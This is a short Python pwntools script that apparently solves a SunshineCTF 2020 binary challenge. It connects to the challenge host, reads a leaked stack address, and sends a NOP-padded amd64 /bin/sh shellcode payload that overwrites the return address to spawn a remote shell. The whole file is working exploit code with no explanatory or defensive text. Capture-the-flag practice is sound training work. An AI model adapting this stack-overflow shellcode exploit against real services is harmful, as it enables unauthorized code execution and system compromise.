#!/usr/bin/python3
from pwn import *
context.arch = "amd64"
#context.log_level = "debug"
p = remote("chal.2020.sunshinectf.org",30006)
#p = process("./chall")
#pid = gdb.attach(p.pid)
leak = int(p.readline().split(b": ")[1].rstrip(),16)-80
print (f"Leak: {hex(leak)}")
p.sendline()
sh = shellcraft.amd64.linux.sh()
payload = b"\x90"*3 + asm(sh)
payload += b"\x90"*(56 - len(payload))
payload += p64(leak)
p.sendline(payload)

p.interactive()
